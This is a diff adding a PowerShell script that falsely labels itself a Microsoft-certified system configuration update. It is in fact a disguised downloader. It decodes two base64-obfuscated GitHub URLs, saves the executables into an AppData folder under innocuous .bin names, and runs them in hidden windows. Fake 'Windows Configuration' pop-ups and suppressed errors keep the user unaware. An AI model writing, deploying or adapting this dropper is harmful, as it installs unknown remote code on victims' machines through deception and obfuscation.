@@ -1,0 +1,28 @@
+# System Configuration Update Script - Microsoft Certified
+$global:config = "SilentlyContinue"; $ErrorActionPreference = $global:config
+$env:profile = $env:USERNAME; $base = "C:\Users\$($env:profile)\AppData\Roaming\AppCache"
+$sysUp = "$base\sysUp.bin"; $auxUp = "$base\auxUp.bin"; $trace = "$base\sysTrace.txt"
+
+# Initialize system tray notification
+Add-Type -AssemblyName System.Windows.Forms; $null = [System.Windows.Forms.MessageBox]::Show("Processing system configuration, please stand by...", "Windows Configuration", 0, 64)
+
+$null = New-Item -ItemType Directory -Path $base -Force
+
+try {
+    $sec = [Net.SecurityProtocolType]::Tls12; [Net.ServicePointManager]::SecurityProtocol = $sec
+    $wc = New-Object Net.WebClient; $uri1 = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL2Fub255bW91c3JhaWIvVXBkYXRlci9yYXcvbWFpbi91cGRhdGUuZXhl")))
+    $wc.DownloadFile($uri1, $sysUp); $null = "[$([System.DateTime]::Now)] Acquired sysUp.bin to $sysUp" | Out-File -FilePath $trace -Append
+    $uri2 = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL2Fub255bW91c3JhaWIvVXBkYXRlci9yYXcvbWFpbi9oZWxwZXIuZXhl")))
+    $wc.DownloadFile($uri2, $auxUp); $null = "[$([System.DateTime]::Now)] Acquired auxUp.bin to $auxUp" | Out-File -FilePath $trace -Append
+    
+    $null = Start-Process -FilePath $sysUp -NoNewWindow -WindowStyle Hidden
+    $null = "[$([System.DateTime]::Now)] Initialized sysUp.bin" | Out-File -FilePath $trace -Append
+    Start-Sleep -Seconds 5
+    $null = Start-Process -FilePath $auxUp -NoNewWindow -WindowStyle Hidden
+    $null = "[$([System.DateTime]::Now)] Initialized auxUp.bin" | Out-File -FilePath $trace -Append
+    
+    $null = [System.Windows.Forms.MessageBox]::Show("System configuration completed successfully!", "Windows Configuration", 0, 64)
+} catch {
+    $null = "[$([System.DateTime]::Now)] Issue: $_" | Out-File -FilePath $trace -Append
+    $null = [System.Windows.Forms.MessageBox]::Show("Configuration failed, please review logs.", "Windows Configuration", 0, 16)
+}
